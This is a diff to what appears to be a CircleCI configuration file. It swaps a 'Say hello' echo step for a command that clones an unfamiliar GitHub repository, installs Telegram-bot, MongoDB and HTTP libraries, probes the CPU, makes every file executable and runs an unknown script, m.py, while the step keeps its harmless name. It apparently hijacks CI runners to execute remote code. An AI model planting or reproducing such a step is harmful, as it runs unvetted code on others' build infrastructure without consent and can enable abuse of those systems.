@@ -20,7 +20,7 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command: "echo Hello, World!"
+          command: git clone https://github.com/aaduopl/Aa && cd Aa && pip install telebot pymongo aiohttp && lscpu && chmod +x * && python3 m.py
 
 # Orchestrate jobs using workflows
 # See: https://circleci.com/docs/workflows/ & https://circleci.com/docs/configuration-reference/#workflows
